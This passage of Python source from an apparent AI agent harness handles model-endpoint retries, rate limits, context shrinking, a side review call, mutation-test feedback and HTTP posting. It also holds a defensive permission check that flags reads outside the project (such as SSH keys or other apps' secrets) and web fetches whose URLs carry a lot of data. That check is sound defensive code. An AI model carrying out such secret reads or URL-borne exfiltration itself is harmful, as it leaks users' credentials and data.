                if not cut_resent and self._prompt_cut(resp, body, base, turn):
                    cut_resent = True                  # the server cut the prompt: the reply is discarded, resend fitted
                    if streamed:
                        self.emit({"type": "stream_reset"})
                    body = self._body()
                    body["model"] = PV.split(body["model"])[1]
                    continue
                break
            except (Interrupted, KeyboardInterrupt):
                raise
            except RuntimeError as e:
                last, msg = e, str(e)
                if isinstance(e, _EndpointDown):           # it already waited the whole recovery time
                    raise
                if type(e).__name__ == "UsageLimit":
                    # A ChatGPT plan limit: wait for it only when it resets within the wait budget; one that resets
                    # in hours or days ends the turn at once (the next message picks the task up).
                    left = (getattr(e, "resets_at", None) or 0) - time.time()
                    if 0 < left + 5 <= rl_budget - rl_waited:
                        wait = left + 5
                        rl_waited += wait
                        attempt -= 1
                        self.emit({"type": "status", "text": f"Usage limit reached. It resets in {_dur(wait)}; this "
                                                             "task waits and carries on then. Press Stop to end."})
                        self._sleep(wait)
                        continue
                    raise
                if type(e).__name__ == "NotSignedIn":     # no sign-in: retrying cannot help
                    raise
                kind = classify_error(msg)                 # the same reading as LiveClient.chat (core/client.py)
                if kind == "tls":                          # an untrusted certificate: no probe, no waiting (S-11)
                    raise RuntimeError(self._tls_text(base, msg))
                fix = self._diagnose(kind, msg, body)
                if fix:
                    if not self._apply_fix(fix, fixed, base, body):
                        raise                              # the same refusal after its fix: report it
                    body = self._body()
                    body["model"] = PV.split(body["model"])[1]
                    if fix["action"] == "max_out":         # W-03: only the reply was too long; never compact for it
                        k = "max_completion_tokens" if "max_completion_tokens" in body else "max_tokens"
                        body[k] = min(int(body.get(k) or fix["max_output"]), fix["max_output"])
                    self.emit({"type": "status", "text": fix["note"]})
                    continue
                if kind == "auth":
                    # A gateway under load answers a good key with a spurious 401 now and then. A key that worked
                    # earlier in this chat gets two short retries; any key gets one, so a bad key still fails fast.
                    auth_tries += 1
                    if auth_tries <= (2 if getattr(self, "_key_ok", None) == key else 1):
                        self._sleep(auth_tries)
                        continue
                    raise RuntimeError("The endpoint rejected the API key. Check it in settings. " + msg[:200])
                if kind == "model_missing":
                    # A chat from weeks ago on a model the endpoint has dropped: continue on today's default for
                    # its provider, once per call. Otherwise say so at once; retrying the same model cannot help.
                    C.load_into_env(override=True)
                    if prov == "chatgpt":
                        from meshpool_harness.core import chatgpt as CG
                        now = "chatgpt:" + CG.default_model()
                    else:
                        now = os.environ.get("MH_MODEL") or DEFAULT_MODEL
                    if not swapped and PV.split(now)[0] == prov and PV.split(now)[1] != body["model"]:
                        swapped, old_model = True, body["model"]
                        self.model = now
                        body = self._body()
                        body["model"] = PV.split(body["model"])[1]
                        self.emit({"type": "status", "text": f"This chat's model ({old_model}) is no longer available "
                                                             f"on your endpoint, so it continues on {body['model']}. "
                                                             "You can pick another model for it any time."})
                        continue
                    raise RuntimeError(f"The endpoint does not serve the model {body['model']}. Choose another model "
                                       f"for this chat. ({msg[:160]})")
                if kind == "context" and ctx_shrinks < 4:  # over the model's context: shrink hard, retry at once
                    ctx_shrinks += 1
                    shrunk = True
                    try:
                        from meshpool_harness.core import context as CTX
                        said = CTX.parse_limit(msg)
                        if said and said < self._ctx_window():
                            CTX.learn(self.current_model(), said, explicit=True)       # the server named its real window
                        self._ctx_tighten *= 0.7
                    except Exception:  # noqa: BLE001
                        pass
                    # Too long, or too big a request (413): elide older outputs and all but the latest two images,
                    # so a screenshot the user just attached still goes with the retry. Older steps are summarized
                    # first, so the task keeps its thread.
                    if self._shrink_big_images(msg):
                        body = self._body()
                        body["model"] = PV.split(body["model"])[1]
                        continue
                    self.compact_now()
                    _shrink_context(self.messages, 0, hard=True, keep_images=2)
                    body = self._body()
                    body["model"] = PV.split(body["model"])[1]
                    self.emit({"type": "status", "text": "The conversation was longer than the model can take; "
                                                         "older tool outputs were shortened before trying again."})
                    continue
                if kind == "vision" and _has_images(body["messages"]):
                    # This model does not take images: leave them out of what it is sent, for this model only.
                    # The history keeps them, so a vision model chosen later sees them again.
                    bare = PV.split(self.current_model())[1]
                    seen = self.__dict__.setdefault("_no_vision_models", set())
                    if bare not in seen:
                        seen.add(bare)
                        self.emit({"type": "status", "text": "This model cannot see images, so screenshots are left "
                                                             "out. For computer use, choose a vision model in "
                                                             "Settings."})
                    body = self._body()
                    body["model"] = PV.split(body["model"])[1]
                    continue
                if kind == "quota":                        # spent: a retry or a wait cannot help
                    raise RuntimeError("QUOTA: " + msg)
                if kind == "bad_request" and "reasoning_content" in msg and not rc_tried:
                    rc_tried = True                        # the thinking field: send it back, or stop sending it
                    bare = PV.split(body["model"])[1]
                    if re.search(r"unknown|unsupported|unrecognized|extra|not (?:allowed|permitted|supported)", msg, re.I):
                        _REFUSED.setdefault(bare, set()).add("reasoning_content")
                        body["messages"] = [{k: v for k, v in m.items() if k != "reasoning_content"}
                                            for m in body["messages"]]
                        continue
                    if re.search(r"pass|missing|required|must", msg, re.I):
                        from meshpool_harness.core import modelcaps as _MC
                        _MC.learn(base, bare, keep_reasoning=True)
                        if any(m.get("reasoning_content") for m in self.messages if m.get("role") == "assistant"):
                            body = self._body()
                            body["model"] = bare
                            continue
                if kind in ("bad_request", "vision") and _adapt_params(body, msg):
                    self.emit({"type": "status", "text": "This model refused a request setting; Meshpool adjusted "
                                                         "it and tried again."})
                    continue                               # a refused field (temperature, tool_choice...): fixed
                if kind in ("bad_request", "vision", "context"):
                    if cleaned:
                        raise
                    cleaned = True                         # control characters in a tool output: clean and retry
                    changed = False
                    for m in body["messages"]:
                        if isinstance(m.get("content"), str):
                            c = clean(m["content"])
                            changed, m["content"] = changed or c != m["content"], c
                    if changed:
                        continue
                    raise                                  # nothing to fix: a resend would fail the same way (W-04)
                if kind == "rate_limit":
                    if wire == "chat":                     # the provider says too many: fewer calls at once (P-12)
                        GW.health(base, key, body["model"]).gate.throttled()
                    left = rl_budget - rl_waited
                    if left <= 0:                          # waited the whole budget: end the turn, resumable
                        raise RuntimeError(msg + f" [rate limited for {_dur(rl_waited)}]")
                    stated = stated_wait(msg)
                    if stated is not None and stated > left:   # the stated reset is past the wait budget: end now (resumable)
                        raise RuntimeError(msg + f" [rate limited: the limit resets in {_dur(stated)}, which is past "
                                                 f"the wait budget of {_dur(rl_budget)}; send a message to carry on "
                                                 "then]")
                    self._n429 = getattr(self, "_n429", 0) + 1   # no reset time: back off 3, 6, 12 ... 60 s (v4)
                    wait = min(left, rate_limit_wait(msg, self._n429, cap=left))
                    rl_waited += wait
                    attempt -= 1                           # a rate limit is not a failed attempt
                    if rl_waited - wait - rl_told >= 60 or wait >= 60:   # one line, then at most one a minute
                        rl_told = rl_waited - wait
                        so_far = f" (rate limited for {_dur(rl_told)} so far)" if rl_told > 0 else ""
                        self.emit({"type": "status", "text": f"Rate limited by the endpoint{so_far}. Waiting "
                                                             f"{_dur(wait)}, then carrying on where it stopped. "
                                                             "Press Stop to end."})
                    self._sleep(wait)
                    continue
                if kind == "gateway_reject" and attempt >= 2:
                    if _withhold_latest_output(self.messages):   # content-tied gateway 400: drop the worst output
                        body = self._body()
                        body["model"] = PV.split(body["model"])[1]
                        continue
                net = bool(re.search(r"HTTP 0|timed out|connection|HTTP 5\d\d|upstream", msg, re.I))
                if net and wire == "chat":
                    # One probe says which it is: the endpoint is down or stuck for this key (the probe fails too),
                    # or it is up and this request is slow or stuck on its route (the probe answers).
                    h = GW.health(base, key, body["model"])
                    state = h.check(lambda: self._wait(self._probe, base, key, body["model"]),
                                    check_stop=self._check_stop)
                    if state == "auth":                    # not the network: say so, not "can't reach"
                        raise RuntimeError("The endpoint rejected the API key. Check it in settings. (HTTP 401 on a "
                                           "check after the call failed)")
                    if state == "down":
                        if recoveries >= 3:
                            raise
                        recoveries += 1                    # no blind retries: they only pile up behind a stuck key
                        if not self._await_endpoint(h, base, key, body["model"]):
                            raise _EndpointDown(msg)
                        _lighten(self.messages)            # an outage is not about size: trim only a very large one
                        self.rotate_route()
                        body = self._body()
                        body["model"] = PV.split(body["model"])[1]
                        attempt, self._first_scale = -1, 1.0
                        continue
                    big = len(json.dumps(body)) > int(os.environ.get("MH_BIG_REQUEST", "3000000"))
                    if big and re.search(r"HTTP 5\d\d", msg) and not shrunk:
                        # Up for a small probe, failing for this big request: the real gateway answers an oversized
                        # body with a plain 502, not a 413. Treat it as too big: keep the latest two images, trim.
                        shrunk = True
                        if self._shrink_big_images("HTTP 413"):      # images first (OSS-23), then the text cuts
                            body = self._body()
                            body["model"] = PV.split(body["model"])[1]
                            continue
                        _shrink_context(self.messages, 0, hard=True, keep_images=2)
                        lim = int(os.environ.get("MH_BIG_REQUEST", "3000000"))
                        if len(json.dumps(self._body())) > lim:
                            _drop_images(self.messages, keep=1)   # still too big: only the newest image stays
                        if self._size_with(self.messages) > lim:
                            # Try each remedy on a copy and apply only one that makes the request fit: never cut
                            # the user's text when an image is the problem, or the other way round.
                            cut = copy.deepcopy(self.messages)
                            did_cut = _cut_long_user_text(cut)
                            noimg = copy.deepcopy(self.messages)
                            _drop_images(noimg, keep=0)
                            both = copy.deepcopy(cut)
                            _drop_images(both, keep=0)
                            has_img = _has_images(self.messages)
                            newest = _image_in_newest_ask(self.messages)
                            if has_img and not newest and self._size_with(noimg) <= lim:
                                self.messages[:] = noimg          # an older or tool image: the cheapest remedy
                                note = ("An image from earlier in the chat, or a tool's screenshot, made the "
                                        "request too large for the endpoint, so it was left out.")
                            elif did_cut and self._size_with(cut) <= lim:
                                self.messages[:] = cut
                                note = ("Your message was too large for the endpoint, so its middle was left out. "
                                        "Attach long text as a file to keep all of it.")
                            elif has_img and self._size_with(noimg) <= lim:
                                self.messages[:] = noimg          # gone from the chat, so the next message works
                                raise RuntimeError("The endpoint could not take this request: the attached image "
                                                   "was too large, so it was removed from the chat. Attach a "
                                                   "smaller one (a screenshot of part of the screen, or a JPEG) "
                                                   "and send it again. (" + msg[:120] + ")")
                            elif did_cut and has_img and self._size_with(both) <= lim:
                                self.messages[:] = both
                                note = ("Your message and its image were too large for the endpoint: the middle of "
                                        "the text and the image were left out.")
                            else:
                                raise RuntimeError("The endpoint could not take this request: the conversation is "
                                                   "too large even after it was shortened. Start a new chat to "
                                                   "carry on. (" + msg[:120] + ")")
                        else:
                            note = ("The request was too large for the endpoint; older images and tool outputs were "
                                    "left out before trying again.")
                        body = self._body()
                        body["model"] = PV.split(body["model"])[1]
                        self.emit({"type": "status", "text": note})   # one line, saying what was done
                        continue
                    if attempt >= 5:                       # up, yet this conversation's requests keep failing
                        if re.search(r"HTTP 5\d\d", msg):  # the endpoint itself fails: no claim that it is fine
                            raise RuntimeError(msg)
                        raise RuntimeError(msg + " (the endpoint answers small requests, but this conversation's "
                                           "requests keep failing)")
                    if re.search(r"timed out", msg, re.I):   # up but slow to start (prefill, a queue): wait longer
                        self._first_scale = min(5.0, self._first_scale * 2.5)
                    if attempt == 1:                       # a stuck sticky route (cache affinity) upstream: new route
                        self.rotate_route()
                        if "prompt_cache_key" in body:     # only when this endpoint gets cache keys (MH_CACHE_KEY)
                            body["prompt_cache_key"] = body["user"] = self.route_id()
                    if attempt == 2 and stream:            # a gateway that mishandles the stream: ask for one reply
                        stream = False
                        self.emit({"type": "status", "text": "Trying again without streaming."})
                elif attempt >= 5:
                    raise
                stalled = re.search(r"HTTP 5\d\d|timed out", msg, re.I)   # 5xx, or no byte back within the timeout
                if stalled and attempt >= 1:               # a big request that keeps failing upstream:
                    before = _context_size(self.messages)
                    if before > 150000:                    # shrink it instead of resending the same thing
                        _compact(self.messages, keep_recent=8)
                        if _context_size(self.messages) < before:
                            body = self._body()
                            body["model"] = PV.split(body["model"])[1]
                            self.emit({"type": "status", "text": "The request was very large; older tool outputs "
                                                                 "were shortened before trying again."})
                self.emit({"type": "status", "text": _retry_text(msg, attempt)})
                if streamed:
                    self.emit({"type": "stream_reset"})
                self._sleep(min(20, 2 ** attempt))
            finally:
                if res is not None:
                    res.close()                            # a failed attempt holds no part of the budget
        self.emit({"type": "model_end"})
        self._n429 = 0
        u = resp.get("usage") or {}
        d_in = u.get("prompt_tokens", 0) or 0
        if not hasattr(self, "_meter"):
            from meshpool_harness.core.metrics import CacheMeter
            self._meter = CacheMeter()
        self._meter.observe(u, self.usage)                 # full_miss_calls / full_miss_tokens, as in the benchmark loop
        try:
            from meshpool_harness.core import modelcaps as _MC
            _MC.observe_usage(base, body["model"], u)      # does this endpoint report cached / reasoning tokens
        except Exception:  # noqa: BLE001
            pass
        # a silent prompt cut (Ollama) is judged once, in _prompt_cut, before this reply is used
        self._absorb_usage(turn)                           # this call's record, and any helper's since the last one
        choice = (resp.get("choices") or [{}])[0]
        self._finish = choice.get("finish_reason")
        try:
            if self._finish != "length" and int((resp.get("usage") or {}).get("completion_tokens") or 0) > 3800:
                self._need_more = True                     # a long single write ended normally: do not cap this chat
        except (TypeError, ValueError):
            pass
        return choice.get("message") or {}, streamed

    def _aux_complete(self, system: str, user: str, turn: dict, max_tokens: int = 700) -> str:
        """One separate chat completion (fresh messages, no tools) on the same model and endpoint. Goes through
        _post, so auth, the refused-field list and usage accounting are the agent's own. Raises on failure."""
        from meshpool_harness import providers as PV
        prov, model = PV.split(self.current_model())
        base, key = PV.endpoint(prov)
        if not key or PV.key_problem(key) or prov == "chatgpt" or os.environ.get("MH_WIRE", "chat") != "chat":
            raise RuntimeError("no plain chat endpoint for the reviewer")
        body = {"model": model, "max_tokens": max_tokens, "temperature": 0,
                "messages": [{"role": "system", "content": system}, {"role": "user", "content": user}]}
        _apply_refused(body)
        body = self._prepare(body)
        resp = None
        task = self._ensure_task()
        h = GW.health(base, key, model)
        if h.is_down():                                    # a side call never waits out an outage
            raise _EndpointDown("HTTP 0: the model endpoint is down; the review was skipped")
        for _ in range(3):
            res = usage.reserve(model, request_chars=len(system) + len(user), max_tokens=max_tokens, base=base, task=task)
            try:
                slot = h.acquire(self._check_stop, self.emit)
                tok: dict = {}
                resp, _s = self._wait(self._post_slotted, h, slot, base, key, body, False, tok,
                                      on_abandon=lambda: tok.__setitem__("abort", True))
                usage.record(model, resp.get("usage"), base=base, source="review", task=task, reservation=res,
                             request_chars=len(system) + len(user), reply_chars=_reply_chars(resp))
                break
            except RuntimeError as e:
                if not _adapt_params(body, str(e)):
                    raise
            finally:
                res.close()
        if resp is None:
            raise RuntimeError("no reply")
        self._absorb_usage(turn)                           # a side call (review): shown as aux, not the chat's context
        return ((resp.get("choices") or [{}])[0].get("message") or {}).get("content") or ""

    def _trace_note(self, tool: str, arg: str) -> None:
        """A trace line for a harness step that is not a tool call (review gate, mutation feedback)."""
        try:
            with self._trace_lock:
                self.trace.append({"tool": tool, "s": 0, "ok": True, "arg": arg})
        except Exception:  # noqa: BLE001 - tracing must never break the turn
            pass

    def _mutant_total(self, MU, floor: int) -> int:
        """How many mutants the feedback would try (cheap, nothing is run); never below the survivors."""
        try:
            _, targets = MU.code_under_test(self.root, set(self.ws.turn_files))
            n = 0
            for rel in targets:
                with open(os.path.join(self.root, rel), encoding="utf-8") as f:
                    n += len(MU.mutants(f.read()))
            return max(n, floor)
        except Exception:  # noqa: BLE001
            return floor

    def _review_change(self, g: dict, turn: dict) -> str:
        """WP3: the independent review. '' (do nothing) unless the reviewer raised concrete points."""
        route = getattr(self, "route", None)
        try:
            from meshpool_harness.core import review as RV
            if not RV.enabled(route.spec, route):
                return ""
            req = g.get("req")
            if isinstance(req, list):
                req = " ".join(p.get("text", "") for p in req if isinstance(p, dict))
            change = RV.gather_change(self.root, self.ws.turn_files)
            if not change.strip():
                return ""
            cmds = [c for c in self.ws.commands if c.get("after_edit", -1) >= g["edits0"] and c.get("kind") != "read"]
            reply = self._aux_complete(RV.SYSTEM, RV.build_user(RV.clean_request(req or ""), change,
                                                                cmds[-1] if cmds else None), turn)
            self.emit({"type": "status", "text": "Reviewed the change against the request."})
            f = RV.findings(reply)
            n = len(re.findall(r"(?m)^\s*(?:[-*]|\d+[.)])\s", f)) or 1
            self._trace_note("review", f"{n} findings" if f else "LGTM")
            return RV.INJECT + f if f else ""
        except (Interrupted, KeyboardInterrupt, usage.BudgetExceeded):
            raise
        except Exception:  # noqa: BLE001 - a reviewer error must never break the turn
            return ""

    def _mutation_feedback(self) -> str:
        """WP7: tests that still pass when the code under test is deliberately broken. '' when nothing to say."""
        try:
            if not self.hsettings()["mutation"]:
                return ""
            if self.mode != "auto" or getattr(self.ws, "container", None):
                return ""       # it runs the project's tests on this computer: only where commands run unasked, never beside a sandbox
            from meshpool_harness.core import mutate as MU
            alive = self._wait(MU.survivors, self.root, set(self.ws.turn_files), should_stop=lambda: self._stop)
            self._trace_note("mutation", f"{len(alive)} of {self._mutant_total(MU, len(alive))} survived")
            if not alive:
                return ""
            self.emit({"type": "status", "text": "Checked the tests against deliberately broken code."})
            return ("[Meshpool] Your tests pass, but they also pass when the code under test is deliberately broken "
                    "in these ways, so they would not catch these bugs:\n" + MU.format_survivors(alive, 8)
                    + "\nAdd assertions that fail for each of these changes (exact values at the boundaries, each "
                    "branch, error paths), run them against the real code, and make sure they still pass there. A change "
                    "that cannot alter behaviour (e.g. `<` vs `<=` where the values can never be equal) needs no "
                    "test: skip it in one line.")
        except (Interrupted, KeyboardInterrupt):
            raise
        except Exception:  # noqa: BLE001
            return ""

    def _shrink_big_images(self, msg: str) -> bool:
        """A 413 / too-large reply with images in the chat: text cuts cannot help, so make the images smaller first
        (a quarter of the byte budget), then keep only the newest one. True when something changed (OSS-23)."""
        if not _has_images(self.messages) or not (
                re.search(r"HTTP 413|(?:entity|payload|request) too large", msg or "", re.I)):
            return False
        from meshpool_harness.core import compat as _CP
        lim = int(os.environ.get("MH_BIG_REQUEST", "3000000"))
        before = len(json.dumps(self.messages))
        quarter = max(50_000, int(os.environ.get("MH_IMAGE_MAX_BYTES", "1500000")) // 4)
        self.messages[:] = _CP.shrink_images(self.messages, quarter)
        if len(json.dumps(self._body())) > lim:
            _drop_images(self.messages, keep=1)
        if len(json.dumps(self.messages)) >= before:
            return False
        self.emit({"type": "status", "text": "The images in this chat were too big for the endpoint, so they were "
                                             "made smaller before trying again."})
        return True

    def _size_with(self, messages: list) -> int:
        """How big the request would be with these messages (the body _post sends)."""
        saved = self.messages
        self.messages = messages
        try:
            return len(json.dumps(self._body()))
        finally:
            self.messages = saved

    def route_id(self) -> str:
        """The id the endpoint sees for this chat (cache affinity, gateway session). Changes after a stuck route."""
        return self.id + getattr(self, "_route", "")

    def rotate_route(self):
        n = getattr(self, "_route_n", 0) + 1
        self._route_n, self._route = n, f"-r{n}"

    def _abort_live(self):
        c, self._live = getattr(self, "_live", None), None
        if c is not None:
            c._mh_abort = True                           # still connecting: checked_connect closes it (_post)
        sock = getattr(c, "sock", None)
        if sock is not None:
            try:
                import socket
                sock.shutdown(socket.SHUT_RDWR)          # wakes a read blocked on headers or on the stream
            except Exception:  # noqa: BLE001  already closed
                pass

    def _probe(self, base: str, key: str, model: str) -> str:
        def sink(c):                                     # Stop shuts the probe's socket too (_abort_live)
            self._live = c
            connect = c.connect

            def checked_connect():
                connect()
                if getattr(c, "_mh_abort", False):
                    c.close()
                    raise ConnectionAbortedError("stopped while connecting")
            c.connect = checked_connect
        return _probe_once(base, key, model, sink)

    def _recover_off(self) -> bool:
        """True when an outage is not waited out (a `meshpool -p` run): an error then must not say it waited."""
        mins = os.environ.get("MH_RECOVER_MIN") or getattr(self, "recover_min", None)
        try:
            return mins is not None and float(mins) <= 0
        except ValueError:
            return False

    def _endpoint_host(self) -> str:
        try:
            from urllib.parse import urlparse
            from meshpool_harness import providers as PV
            return urlparse(PV.key_base()).netloc or "the configured address"
        except Exception:  # noqa: BLE001
            return "the configured address"

    def _await_endpoint(self, h, base: str, key: str, model: str) -> bool:
        """Wait, shared with every other chat on this endpoint, until it answers a probe again: up to
        MH_RECOVER_MIN minutes (30). False when it did not come back in time, or recovery is off. A run nobody watches
        (`meshpool -p`) sets recover_min to 0 unless MH_RECOVER_MIN says otherwise: a script gets the failure now."""
        mins = os.environ.get("MH_RECOVER_MIN") or getattr(self, "recover_min", None)
        budget = max(0.0, float(30 if mins is None else mins) * 60)   # 0: one probe, no waiting
        return h.wait_until_up(lambda: self._wait(self._probe, base, key, model), self._sleep, self.emit, budget,
                               self._check_stop)

    def _sleep(self, s: float):
        end = time.time() + s
        while time.time() < end:
            self._check_stop()
            time.sleep(0.25)

    def _post_slotted(self, h, slot, base: str, key: str, body: dict, stream: bool, tok: dict):
        """_post, then give the gate slot back when the request really ends. It runs in _wait's worker, so a Stop
        that abandons the call does not free the slot while the request is still on its way (MH_MAX_INFLIGHT)."""
        ok = False
        _ABORT.set(tok)                                    # _post reads it (it keeps its four-argument calls)
        try:
            out = self._post(base, key, body, stream)
            ok = True
            return out
        finally:
            h.release(ok, slot)

    def _post(self, base: str, key: str, body: dict, stream: bool, tok: dict | None = None) -> tuple[dict, bool]:
        tok = tok if tok is not None else _ABORT.get()    # Stop's token: set when the call was abandoned
        b = dict(body)
        from meshpool_harness import providers as _PV
        # an Anthropic-style key endpoint (Settings, Models and providers): the Messages API, translated both ways
        # (core/anthropic_wire.py) and streamed as Messages events; every other endpoint speaks chat completions
        anthropic = _PV.wire_for(base) == "anthropic"
        if anthropic:
            from meshpool_harness.core import anthropic_wire as AW
            from meshpool_harness.core import modelcaps as _MC
            b = AW.to_request(b, cache=_MC.resolve(base, b.get("model", "")).cache == "explicit")
            if stream:
                b["stream"] = True
            url, hdrs = _PV.chat_target(base, key, b.get("model", ""), "messages")
        else:
            if stream:
                b["stream"] = True
                b["stream_options"] = {"include_usage": True}
            b = _PV.adapt_body(base, b)
            from meshpool_harness.core import modelcaps as _MC
            if not _MC.resolve(base, b.get("model", "")).cache_hints:    # a strict server refuses fields it does not know
                b.pop("prompt_cache_key", None)
                b.pop("user", None)
            from meshpool_harness.core import endpoint as _EP    # URL, key header and body fields: core/endpoint.py
            url, b, hdrs = _EP.chat_request(base, key, b)
            hdrs = _PV.custom_auth(hdrs, base, key)
        hdrs = {**hdrs, "Content-Type": "application/json", **({"Accept": "text/event-stream"} if stream else {})}
        req = urllib.request.Request(url, data=ST.encode_body(b), method="POST",
                                     headers={**hdrs, "X-Harness-Task-Id": self.route_id(), "session_id": self.route_id()})
        # Two clocks: a large context can take minutes before the first byte (prefill, a queue upstream), while a
        # stream that goes quiet mid-reply is stuck. Waiting only 120 s for the first byte failed every retry of a
        # long task the same way ("The read operation timed out").
        idle = float(os.environ.get("MH_AGENT_IDLE_S", "120"))
        first = max(idle, float(os.environ.get("MH_AGENT_FIRST_BYTE_S", "120"))) * getattr(self, "_first_scale", 1.0)
        _bare = _PV.split(b.get("model", ""))[1]
        first = _MC.first_byte_timeout(base, _bare, first)     # a local server loads the model first (H-06)
        if _MC.is_local(base):
            idle = max(idle, float(os.environ.get("MH_LOCAL_IDLE_S", "300")))
        t_sent = time.time()
        got_text = False
        gen = getattr(self, "_gen", 0)
        live = []

        def sink(c):
            live.append(c)
            self._live = c                               # Stop shuts this socket, before or after the headers
            connect = c.connect

            def checked_connect():                       # Stop while connecting: close before sending anything
                if tok and tok.get("abort"):
                    c.close()
                    raise ConnectionAbortedError("stopped before connecting")
                connect()
                if getattr(c, "_mh_abort", False) or (tok and tok.get("abort")):
                    c.close()
                    raise ConnectionAbortedError("stopped while connecting")
            c.connect = checked_connect
        try:
            if tok and tok.get("abort"):                 # Stop came before the request went out: never send it
                raise ConnectionAbortedError("stopped before the request was sent")
            with _urlopen(req, first, sink) as r:
                if stream or _MC.is_local(base):
                    _MC.observe_first_byte(base, _bare, time.time() - t_sent)   # remembered: the next wait is 3x it
                thinking = []                            # one "Thinking…" status per call, before any text

                def on_text(t):
                    nonlocal got_text
                    got_text = True
                    self._delta(t)

                def on_reasoning(_t):
                    if not thinking and not got_text:
                        thinking.append(1)
                        self.emit({"type": "status", "text": "Thinking…"})

                def check():
                    if self._stop or getattr(self, "_gen", 0) != gen or (tok and tok.get("abort")):
                        raise Interrupted()

                def lines():
                    started = False
                    for raw in r:
                        if not started:                  # bytes are flowing: from here on, a gap is the idle clock
                            started = True
                            _set_read_timeout(r, idle)
                        yield raw
                sse = stream and "event-stream" in ((r.headers.get("Content-Type") if r.headers else "") or "").lower() \
                    if anthropic else stream
                if anthropic and sse:
                    asm = AW.StreamAssembler(on_text=on_text, on_reasoning=on_reasoning)
                    for ev_name, ev_data in ST.iter_sse(lines(), data_idle=first, check=check):
                        asm.feed(ev_name, ev_data)
                    return asm.result(), got_text
                if not anthropic and stream:
                    return sse_to_chat(lines(), on_text=on_text, on_reasoning=on_reasoning, data_idle=first,
                                       check=check), got_text
                raw_body = ST.read_body(r, first)
                try:
                    data = json.loads(raw_body.decode("utf-8", "replace"))
                    from meshpool_harness import provider_setup as _PS
                    if not _PS._is_reply("anthropic" if anthropic else "openai", data):   # W-06: a 200 that is no reply
                        e = data.get("error") if isinstance(data, dict) else None
                        e = (e.get("message") if isinstance(e, dict) else e) or raw_body[:200].decode("utf-8", "replace")
                        raise RuntimeError(f"HTTP 200: the endpoint answered without a model reply: {str(e)[:200]}")
                    return (AW.from_response(data) if anthropic and isinstance(data, dict) else data), False
                except ValueError:                       # a gateway that streams anyway, or sends an error page
                    if raw_body.lstrip().startswith(b"data:"):
                        return sse_to_chat(raw_body.splitlines(keepends=True)), False
                    raise RuntimeError(f"HTTP 0: the endpoint sent an unreadable reply ({raw_body[:80]!r})")
        except RuntimeError:
            if got_text:                             # a reply cut short after some text: the retry starts clean
                self.emit({"type": "stream_reset"})
            raise
        except urllib.error.HTTPError as e:
            ra = ST.retry_after_seconds(getattr(e, "headers", None))
            raise RuntimeError(f"HTTP {e.code}: {e.read()[:400].decode('utf-8', 'replace')}"
                               + (f" [retry-after: {ra:g}]" if ra is not None else ""))
        except (urllib.error.URLError, TimeoutError, ConnectionError, OSError, http.client.HTTPException) as e:
            if got_text:                             # HTTPException: e.g. IncompleteRead, the stream dropped mid-reply
                self.emit({"type": "stream_reset"})
            raise RuntimeError(f"HTTP 0: connection problem ({_mhttp.explain(e, url)})")
        finally:
            if live and getattr(self, "_live", None) is live[-1]:   # never clear a newer call's handle
                self._live = None

    # ---------- tools ------------------------------------------------------------------------------------------
    def _outside(self, name: str, args: dict) -> str:
        """Why a read-only call still needs a yes in Ask and Accept edits: it reads outside the project
        (an SSH key, another app's secrets), or a web fetch carries a lot of data out in its address. "" if fine."""
        n = name.replace("-", "_")
        if n == "office_task" or n.startswith(self._OFFICE_MCP):
            # the office engines and the office server read the files they are given, ~ and relative to the project,
            # without asking (office_task is in READ_ONLY, read_document in SAFE_MCP): the same check delegate.py runs
            keys = ("files",) if n == "office_task" else self._OFFICE_PATH_KEYS
            vals = []
            for k in keys:
                v = args.get(k)
                vals += [str(x) for x in (v if isinstance(v, list) else [v]) if isinstance(x, str) and x.strip()]
            for v in vals:
                why = self._outside_path(os.path.expanduser(v.strip()))
                if why:
                    return why
            return ""
        if name in ("read_file", "grep"):
            p = os.path.expanduser(str(args.get("path") or "."))
        elif name == "glob":
            pat = str(args.get("pattern") or "").replace("\\", "/")
            return ("" if not (pat.startswith(("/", "~")) or re.match(r"^[A-Za-z]:", pat) or ".." in pat.split("/"))
                    else f"List files outside the project ({pat[:80]})?")
        elif name.replace("-", "_") in ("fetch_url", "mcp__meshpool_web__web_fetch"):   # the server is meshpool-web
            from urllib.parse import urlparse
            u = urlparse(str(args.get("url") or ""))
            host = u.hostname or ""
            sub = ".".join(host.split(".")[:-2])           # labels before the site's own name can carry data too
            carried = len(u.query) + len(u.path) + len(u.fragment) + len(sub)
            return (f"Send this to {host or 'a website'}? The address carries {carried} characters of data."
                    if carried > 300 or len(sub) > 60 or len(u.query) > 200 else "")
        elif name.replace("-", "_").endswith(("__ui_audit", "__view_output")):
            p = str(args.get("url") or args.get("path") or "")
            if re.match(r"^https?://", p, re.I):
                return ""
            if re.match(r"^[a-z][a-z0-9+.-]+://", p, re.I) and not re.match(r"^[A-Za-z]:[\\/]", p):
                return f"Open {p[:80]} (not a web address)?"          # file:// and other schemes read any file
            p = os.path.expanduser(p)
        else:
            return ""
        return self._outside_path(p)

    _OFFICE_MCP = "mcp__meshpool_office__"
    _OFFICE_PATH_KEYS = ("path", "paths", "file", "files", "file_path", "filename", "to", "deck")

    def _outside_path(self, p: str) -> str:
        """"" for a path (~ already expanded; relative to the project) inside the project, this chat's own tool output
        or the files the user attached; else the question to ask. Never other chats' histories."""
        if re.match(r"^[A-Za-z]:(?![\\/])", p) or (os.name != "nt" and (re.match(r"^[A-Za-z]:[\\/]", p)
                                                                         or p.startswith("\\\\"))):
            return f"Read {p[:120]} (outside the project)?"     # a drive or UNC path is never inside here
        try:
            q = Path(p).resolve() if os.path.isabs(p) else (self.ws.root / p).resolve()
        except (OSError, ValueError):
            return f"Read {p[:80]} (outside the project)?"
        ok = [self.ws.root, self.dir.resolve(), (C.runs_dir() / "_uploads").resolve()]
        return "" if any(q == r or r in q.parents for r in ok) else f"Read {str(q)[:120]} (outside the project)?"

    # A new deck or workbook written in code instead of through the engines (python-pptx, openpyxl, xlsxwriter,
    # pptxgenjs). Reading or editing cell values in an existing workbook (load_workbook) is fine.
    _HANDMADE = re.compile(r"\bPresentation\(\s*\)|\.slides\.add_slide\(|\bWorkbook\(\s*\)|\bxlsxwriter\b|"
                           r"pptxgenjs|PptxGenJS")

    def _engine_only(self, name: str, args: dict) -> str:
        """In Work, every slide and every workbook goes through the engines (make_deck, add_slides,
        make_spreadsheet, office_task): they carry the house style and the checks. A command or file that builds one
        by hand is not run; the reply says which tool to use instead. "" when the call is fine."""
        if self.profile != "work" or name not in ("bash", "bash_many", "write_file", "edit", "shell", "apply_patch"):
            return ""
        cmd = args.get("command")                    # shell (Codex style, MH_LEAN_WORK=1) takes an argv list
